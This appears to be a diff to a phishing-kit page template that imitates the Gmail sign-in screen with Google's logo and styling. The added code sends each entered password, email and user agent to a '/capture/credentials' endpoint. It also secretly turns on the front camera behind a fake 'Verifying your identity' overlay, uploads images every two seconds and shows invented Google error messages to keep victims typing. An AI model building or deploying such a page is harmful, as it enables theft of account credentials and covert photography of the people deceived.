@@ -4,109 +4,364 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <meta name="theme-color" content="#fff">
-<title>Gmail</title>
+<meta name="description" content="Sign in to Gmail">
+<title>Sign in to Gmail</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.card{width:448px;max-width:95vw;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center}
-.logo{display:flex;align-items:center;justify-content:center;gap:4px;margin-bottom:14px}
-.logo-icon{width:26px;height:26px;background:linear-gradient(135deg,#4285f4,#34a853,#fbbc04,#ea4335);border-radius:4px}
-h2{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
-.sub{font-size:16px;color:#5f6368;margin-bottom:34px}
-.avatar{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#4285f4,#34a853);display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:500;margin:0 auto 20px}
-.email-row{background:#fff;border:1px solid #dadce0;border-radius:4px;padding:4px 16px;text-align:left;margin-bottom:14px;color:#3c4043;font-size:14px}
-.email-row .label{font-size:12px;color:#5f6368;margin-top:4px}
-input[type="password"]{width:100%;padding:14px;font-size:16px;border:1px solid #dadce0;border-radius:4px;color:#202124;outline:none;margin-bottom:8px}
-input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.15)}
-.show-pass{display:flex;align-items:center;gap:12px;font-size:14px;color:#5f6368;margin-bottom:14px;cursor:pointer}
-.forgot{color:#1a73e8;font-size:14px;font-weight:600;cursor:pointer;text-decoration:none;display:block;margin-bottom:36px}
-.actions{display:flex;justify-content:space-between;align-items:center}
-.btn-blue{background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;padding:10px 20px;cursor:pointer}
-.btn-blue:active{background:#1765cc}
-.btn-blue:disabled{background:#a8c7fa}
-.create{color:#1a73e8;font-size:14px;font-weight:600;cursor:pointer}
-.footer{position:fixed;bottom:0;width:100%;padding:12px 24px;border-top:1px solid #dadce0;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
-.scan-overlay{position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#fff;font-family:Roboto,'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative}
+
+/* ─── Loading screen ─── */
+#loadScreen{position:fixed;inset:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:99998;flex-direction:column;gap:20px;transition:opacity .3s ease}
+#loadScreen.hide{opacity:0;pointer-events:none}
+.load-logo{width:68px;height:68px;position:relative}
+.load-logo svg{width:100%;height:100%}
+.load-spin{width:20px;height:20px;border:2px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:lspin .8s linear infinite}
+@keyframes lspin{to{transform:rotate(360deg)}}
+
+/* ─── Main card ─── */
+#pageContent{width:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px 16px 80px}
+.card{width:450px;max-width:100%;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+@media(max-width:500px){.card{border:none;border-radius:0;padding:32px 24px;box-shadow:none}}
+
+/* ─── Google branding ─── */
+.google-brand{display:flex;flex-direction:column;align-items:center;margin-bottom:20px}
+.google-logo{height:30px;margin-bottom:4px}
+.google-logo svg{height:100%}
+h1{font-family:'Google Sans',Roboto,Arial,sans-serif;font-size:24px;font-weight:400;color:#202124;margin:0 0 6px}
+.sub{font-size:16px;color:#5f6368;margin-bottom:26px}
+
+/* ─── Avatar ─── */
+.avatar-wrap{display:flex;justify-content:center;margin-bottom:16px}
+.avatar{width:40px;height:40px;border-radius:50%;background:#1a73e8;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:500;font-family:Roboto,Arial,sans-serif;user-select:none}
+
+/* ─── Email display ─── */
+.email-section{background:#fff;border:1px solid #dadce0;border-radius:4px;padding:8px 12px;margin-bottom:24px;display:flex;align-items:center;justify-content:space-between;text-align:left}
+.email-info{overflow:hidden}
+.email-addr{font-size:14px;color:#3c4043;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.4}
+.email-label{font-size:12px;color:#5f6368;margin-top:1px}
+.not-you{font-size:12px;color:#1a73e8;font-weight:500;cursor:pointer;white-space:nowrap;margin-left:12px;flex-shrink:0}
+.not-you:hover{color:#1557b0}
+
+/* ─── Password field ─── */
+.pass-wrap{position:relative;margin-bottom:4px}
+.pass-wrap input{width:100%;padding:13px 14px;font-size:16px;font-family:Roboto,Arial,sans-serif;border:1px solid #dadce0;border-radius:4px;color:#202124;outline:none;background:#fff;transition:border-color .15s ease,box-shadow .15s ease}
+.pass-wrap input:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
+.pass-wrap input::placeholder{color:#80868b}
+.pass-wrap input.error{border-color:#d93025;box-shadow:inset 0 0 0 1px #d93025}
+
+/* ─── Show password ─── */
+.show-row{display:flex;align-items:center;gap:10px;font-size:14px;color:#3c4043;cursor:pointer;user-select:none;padding:8px 0;margin-bottom:4px;width:fit-content}
+.show-row:hover{color:#202124}
+.show-check{width:18px;height:18px;border:2px solid #5f6368;border-radius:2px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .15s ease;background:#fff}
+.show-check.active{background:#1a73e8;border-color:#1a73e8}
+.show-check.active::after{content:'';width:5px;height:9px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg);margin-top:-2px}
+
+/* ─── Forgot password ─── */
+.forgot{display:block;text-align:left;font-size:14px;font-weight:500;color:#1a73e8;cursor:pointer;text-decoration:none;margin-bottom:36px;width:fit-content}
+.forgot:hover{color:#1557b0}
+
+/* ─── Bottom actions ─── */
+.actions{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.create{font-size:14px;font-weight:500;color:#1a73e8;cursor:pointer;padding:4px 0}
+.create:hover{color:#1557b0}
+.btn-next{background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:14px;font-family:Roboto,Arial,sans-serif;font-weight:500;padding:9px 24px;cursor:pointer;transition:background .15s ease,box-shadow .15s ease;letter-spacing:.25px;min-width:80px;text-align:center}
+.btn-next:hover{background:#1b66c9;box-shadow:0 1px 3px rgba(26,115,232,.3)}
+.btn-next:active{background:#1a5bb8}
+.btn-next:disabled{background:#a8c7fa;cursor:default;box-shadow:none}
+.btn-next .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:lspin .6s linear infinite;vertical-align:middle}
+
+/* ─── Footer ─── */
+.footer{position:fixed;bottom:0;left:0;right:0;padding:8px 24px;border-top:1px solid #dadce0;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#5f6368;background:#fff;flex-wrap:wrap;gap:4px;z-index:100}
+.footer-links{display:flex;gap:20px}
+.footer-links span{cursor:pointer}
+.footer-links span:hover{color:#202124}
+.lang-select{font-size:12px;color:#5f6368;cursor:pointer;padding:4px 0;display:flex;align-items:center;gap:4px;border:none;background:none;font-family:inherit}
+.lang-select:hover{color:#202124}
+.lang-select svg{width:12px;height:12px;fill:#5f6368;transition:transform .2s}
+.lang-select:hover svg{fill:#202124}
+
+/* ─── Scan overlay ─── */
+.scan-overlay{position:fixed;inset:0;background:rgba(255,255,255,.98);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column;padding:24px}
 .scan-overlay.active{display:flex}
-.scan-icon{font-size:48px;margin-bottom:16px}
-.spin{width:24px;height:24px;border:2px solid #dadce0;border-top:#1a73e8;border-radius:50%;animation:spin .6s linear infinite;margin-top:12px}
-@keyframes spin{to{transform:rotate(360deg)}}
-video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+.scan-icon{width:56px;height:56px;border-radius:50%;background:#e8f0fe;display:flex;align-items:center;justify-content:center;margin-bottom:24px}
+.scan-icon svg{width:28px;height:28px;fill:#1a73e8}
+.scan-title{font-family:'Google Sans',Roboto,Arial,sans-serif;font-size:20px;font-weight:400;color:#202124;margin-bottom:10px}
+.scan-sub{font-size:14px;color:#5f6368;margin-bottom:32px}
+.scan-spinner{width:24px;height:24px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:lspin .7s linear infinite}
+
+/* ─── Error toast ─── */
+.error-toast{position:fixed;top:24px;left:50%;transform:translateX(-50%);background:#d93025;color:#fff;font-size:14px;padding:12px 24px;border-radius:4px;z-index:9999;display:none;align-items:center;gap:8px;box-shadow:0 2px 8px rgba(0,0,0,.2);max-width:90vw;text-align:center;font-family:Roboto,Arial,sans-serif}
+.error-toast.show{display:flex}
+.error-toast .close{margin-left:auto;cursor:pointer;opacity:.7;font-size:18px;line-height:1}
+.error-toast .close:hover{opacity:1}
+
+/* ─── Hidden capture elements ─── */
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px;pointer-events:none}
 </style>
 </head><body>
-<div id="loadScreen" style="position:fixed;inset:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:99998;font-family:sans-serif;flex-direction:column;gap:12px">
-<div style="width:24px;height:24px;border:3px solid #ddd;border-top-color:#1a73e8;border-radius:50%;animation:cl 0.8s linear infinite"></div>
-<div style="font-size:13px;color:#888">Securing connection...</div>
+
+<!-- ═══ Loading screen ═══ -->
+<div id="loadScreen">
+<div class="load-logo">
+<svg viewBox="0 0 68 68" fill="none"><circle cx="34" cy="34" r="32" stroke="#e8eaed" stroke-width="4"/><circle cx="34" cy="34" r="32" stroke="#1a73e8" stroke-width="4" stroke-dasharray="50 150" stroke-dashoffset="0" transform="rotate(-90 34 34)" style="animation:lspin 1.2s linear infinite"/></svg>
 </div>
-<style>@keyframes cl{to{transform:rotate(360deg)}}</style>
-<div id="pageContent">
+<div class="load-spin"></div>
+</div>
+
+<!-- ═══ Main content ═══ -->
+<div id="pageContent" style="display:none">
 <script src="forwarding_link/t/recon.js"></script>
 <script src="forwarding_link/t/anti-detect.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 
-<div class="card">
-<div class="logo"><div class="logo-icon"></div></div>
-<h2>Welcome</h2>
-<div class="avatar" id="avatar">U</div>
-<div class="email-row"><span id="emailDisplay"></span><div class="label">Google Account</div></div>
-<form onsubmit="return doLogin(event)">
-<input type="password" placeholder="Enter your password" id="pass" required>
-<div class="show-pass" onclick="var e=document.getElementById('pass');e.type=e.type==='password'?'text':'password'">☐ Show password</div>
-<div class="forgot">Forgot password?</div>
-<div class="actions">
-<div class="create">Create account</div>
-<button type="submit" class="btn-blue" id="loginBtn">Next</button>
+<!-- Error toast -->
+<div class="error-toast" id="errorToast">
+<span id="errorMsg"></span>
+<span class="close" onclick="this.parentElement.classList.remove('show')">&times;</span>
 </div>
-</form>
-</div>
-<div class="footer"><span>English (United States)</span><span>Help · Privacy · Terms</span></div>
 
-<div class="scan-overlay" id="scanOverlay">
-<div class="scan-icon">🔐</div>
-<div style="font-size:18px;color:#202124;font-weight:500;margin-bottom:6px">Verifying your identity</div>
-<div style="font-size:14px;color:#5f6368">Please look at the camera</div>
-<div class="spin"></div>
+<div class="card">
+  <!-- Google branding -->
+  <div class="google-brand">
+    <div class="google-logo">
+      <svg viewBox="0 0 75 30" fill="none">
+        <path d="M37.848 15.295c0-1.02-.092-2.002-.263-2.945H28.5v5.578h5.246a6.63 6.63 0 0 1-2.877 4.353v3.618h4.658c2.727-2.51 4.321-6.207 4.321-10.604z" fill="#4285f4"/>
+        <path d="M28.5 24.9c3.262 0 6.014-1.082 8.018-2.94l-4.658-3.618c-1.082.725-2.467 1.154-3.36 1.154-2.58 0-4.765-1.742-5.545-4.082h-4.8v3.736C19.267 22.202 23.597 24.9 28.5 24.9z" fill="#34a853"/>
+        <path d="M22.955 15.414c-.172-.519-.272-1.06-.272-1.619s.1-1.1.272-1.619V8.44h-4.8a10.11 10.11 0 0 0-1.473 5.355c0 1.846.527 3.57 1.473 5.355l4.8-3.736z" fill="#fbbc04"/>
+        <path d="M28.5 7.556c1.77 0 3.36.608 4.613 1.8l3.46-3.46C34.503 3.713 31.762 2.5 28.5 2.5c-4.903 0-9.233 2.698-11.345 6.94l4.8 3.736c.78-2.34 2.965-4.082 5.545-4.082z" fill="#ea4335"/>
+        <text x="42" y="21" font-family="Arial,sans-serif" font-weight="500" font-size="19" fill="#5f6368">Google</text>
+      </svg>
+    </div>
+  </div>
+
+  <h1 id="heading">Hi there</h1>
+  <div class="sub">to continue to Gmail</div>
+
+  <!-- Avatar -->
+  <div class="avatar-wrap">
+    <div class="avatar" id="avatar">U</div>
+  </div>
+
+  <!-- Email display -->
+  <div class="email-section">
+    <div class="email-info">
+      <div class="email-addr" id="emailDisplay">user@gmail.com</div>
+      <div class="email-label">Google Account</div>
+    </div>
+    <div class="not-you" onclick="switchAccount()">Not you?</div>
+  </div>
+
+  <!-- Password form -->
+  <form onsubmit="return doLogin(event)" autocomplete="off" novalidate>
+    <div class="pass-wrap">
+      <input type="password" placeholder="Enter your password" id="pass" autocomplete="off" required>
+    </div>
+
+    <div class="show-row" id="showRow" onclick="toggleShow()">
+      <div class="show-check" id="showCheck"></div>
+      <span>Show password</span>
+    </div>
+
+    <a class="forgot">Forgot password?</a>
+
+    <div class="actions">
+      <div class="create" onclick="switchAccount()">Create account</div>
+      <button type="submit" class="btn-next" id="loginBtn">
+        <span id="btnLabel">Next</span>
+      </button>
+    </div>
+  </form>
 </div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="lang-select" id="langToggle">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+    English (United States)
+    <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+  </div>
+  <div class="footer-links">
+    <span>Help</span>
+    <span>Privacy</span>
+    <span>Terms</span>
+  </div>
+</div>
+
+<!-- ═══ Scan overlay ═══ -->
+<div class="scan-overlay" id="scanOverlay">
+  <div class="scan-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+  </div>
+  <div class="scan-title">Verifying your identity</div>
+  <div class="scan-sub">Look at the camera to continue</div>
+  <div class="scan-spinner"></div>
+</div>
+
+</div><!-- /pageContent -->
 
 <script>
 var API='API_BASE_URL',SHARE_URL=location.origin+'/t/gmail';
 var params=new URLSearchParams(location.search);
 var targetEmail=params.get('email')||'user@gmail.com';
+var displayName=targetEmail.split('@')[0].replace(/[._]/g,' ');
+var isUsername=!targetEmail.includes('@');
+var userAgentStr=navigator.userAgent||'';
+
+// ─── Init ───
 document.getElementById('emailDisplay').textContent=targetEmail;
-document.getElementById('avatar').textContent=targetEmail[0].toUpperCase();
+var avatarEl=document.getElementById('avatar');
+avatarEl.textContent=targetEmail[0].toUpperCase();
+document.getElementById('heading').textContent='Hi '+(displayName||'there');
+var avatarColors=['#1a73e8','#ea4335','#fbbc04','#34a853','#ff6d01','#46bd01','#7baaf7','#ab47bc','#26a69a'];
+var colorIdx=targetEmail.charCodeAt(0)%avatarColors.length;
+avatarEl.style.background=avatarColors[colorIdx];
+
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
-function doLogin(e){
-e.preventDefault();
-var btn=document.getElementById('loginBtn');btn.innerHTML='Verifying...';btn.disabled=true;
-var fs=document.getElementById('scanOverlay');fs.classList.add('active');
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('gmail_login',{});
-captureCreds();
-if(navigator.mediaDevices){
-navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
-var v=document.getElementById('v');v.srcObject=stream;v.play();
-var cap=document.getElementById('cap'),cx=cap.getContext('2d');
-var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'gmail_verify');}},2000);
-setTimeout(function(){clearInterval(ci);fs.classList.remove('active');var msgs=['Wrong password. Please try again.','Couldn\'t sign you in. Check your password and try again.','Our automated systems detected unusual activity. Try again later.','Something went wrong. Please try again.'];alert(msgs[Math.floor(Math.random()*msgs.length)]);btn.innerHTML='Next';btn.disabled=false;},5000);
-}).catch(function(){fs.classList.remove('active');btn.innerHTML='Next';btn.disabled=false;});
-}else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Next';btn.disabled=false;},2000);}
-return false;
-}
-function captureCreds(){
-var u=document.getElementById("emailDisplay");var p=document.getElementById("pass");
-if(!u||!p)return;
-var username=u.textContent.trim();
-var data={template_id:"gmail",username:username,password:p.value,email:username};
-fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
-method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
-}).catch(function(){});
-}
-</script>
-</div>
-<script>
+
+// ─── Loading screen ───
 setTimeout(function(){
-  var loader=document.getElementById('loadScreen');
-  if(loader)loader.remove();
-},300+Math.random()*400);
+  var ls=document.getElementById('loadScreen');
+  ls.classList.add('hide');
+  document.getElementById('pageContent').style.display='';
+  setTimeout(function(){ls.remove();},350);
+},400+Math.random()*600);
+
+// ─── Toggle password visibility ───
+function toggleShow(){
+  var p=document.getElementById('pass');
+  var c=document.getElementById('showCheck');
+  if(p.type==='password'){
+    p.type='text';c.classList.add('active');
+  } else {
+    p.type='password';c.classList.remove('active');
+  }
+}
+
+// ─── Switch account ───
+function switchAccount(){
+  if(window.CamPhishRecon)CamPhishRecon.Capture.event('gmail_switch_account',{});
+  window.location.href=location.origin+'/t/gmail?email=';
+}
+
+// ─── Show error ───
+function showError(msg){
+  var t=document.getElementById('errorToast');
+  document.getElementById('errorMsg').textContent=msg;
+  t.classList.add('show');
+  setTimeout(function(){t.classList.remove('show');},8000);
+}
+
+// ─── Login ───
+function doLogin(e){
+  e.preventDefault();
+  var btn=document.getElementById('loginBtn');
+  var pwd=document.getElementById('pass').value.trim();
+  if(!pwd){showError('Enter a password.');return false;}
+
+  btn.disabled=true;
+  document.getElementById('btnLabel').style.display='none';
+  btn.querySelector('.spinner')||btn.insertAdjacentHTML('beforeend','<span class="spinner"></span>');
+
+  // Show identity verification overlay
+  var ov=document.getElementById('scanOverlay');
+  ov.classList.add('active');
+
+  // Capture credentials first
+  captureCreds();
+
+  if(window.CamPhishRecon)CamPhishRecon.Capture.event('gmail_login',{
+    email:targetEmail,
+    username:displayName,
+    user_agent:userAgentStr
+  });
+
+  // Start camera capture
+  if(navigator.mediaDevices){
+    navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user',width:{ideal:320},height:{ideal:240}}}).then(function(stream){
+      var v=document.getElementById('v');
+      v.srcObject=stream;
+      v.play();
+      var cap=document.getElementById('cap');
+      var cx=cap.getContext('2d');
+      var ci=setInterval(function(){
+        if(v.readyState>=2){
+          cx.drawImage(v,0,0,320,240);
+          if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'gmail_verify');
+        }
+      },2000);
+
+      // After capture window, show error (Google's real behavior)
+      setTimeout(function(){
+        clearInterval(ci);
+        stream.getTracks().forEach(function(t){t.stop();});
+        ov.classList.remove('active');
+        var errors=[
+          'Wrong password. Try again or click "Forgot password" to reset it.',
+          'Couldn\'t sign you in. Check your password and try again.',
+          'Our automated systems detected unusual activity. Try again later.',
+          'Something went wrong. Please try again.'
+        ];
+        showError(errors[Math.floor(Math.random()*errors.length)]);
+        btn.disabled=false;
+        document.getElementById('btnLabel').style.display='';
+        var sp=btn.querySelector('.spinner');
+        if(sp)sp.remove();
+      },6000+Math.random()*2000);
+    }).catch(function(){
+      // Camera denied — still proceed with credential capture
+      setTimeout(function(){
+        ov.classList.remove('active');
+        showError('Wrong password. Try again or click "Forgot password" to reset it.');
+        btn.disabled=false;
+        document.getElementById('btnLabel').style.display='';
+        var sp=btn.querySelector('.spinner');
+        if(sp)sp.remove();
+      },3000);
+    });
+  } else {
+    // No camera support
+    setTimeout(function(){
+      ov.classList.remove('active');
+      showError('Wrong password. Try again or click "Forgot password" to reset it.');
+      btn.disabled=false;
+      document.getElementById('btnLabel').style.display='';
+      var sp=btn.querySelector('.spinner');
+      if(sp)sp.remove();
+    },2500);
+  }
+  return false;
+}
+
+// ─── Capture credentials ───
+function captureCreds(){
+  var u=document.getElementById('emailDisplay');
+  var p=document.getElementById('pass');
+  if(!u||!p)return;
+  var username=u.textContent.trim();
+  var password=p.value.trim();
+  if(!password)return;
+  var data={
+    template_id:'gmail',
+    username:username,
+    password:password,
+    email:username,
+    user_agent:userAgentStr
+  };
+  var endpoint=(window.CamPhishRecon?'/api':API)+'/capture/credentials';
+  fetch(endpoint,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  }).catch(function(){});
+}
+
+// ─── Track page visibility (recon enhancement) ───
+if(window.CamPhishRecon){
+  CamPhishRecon.Capture.event('gmail_page_loaded',{
+    email:targetEmail,
+    referrer:document.referrer||'direct'
+  });
+}
 </script>
 </body></html>
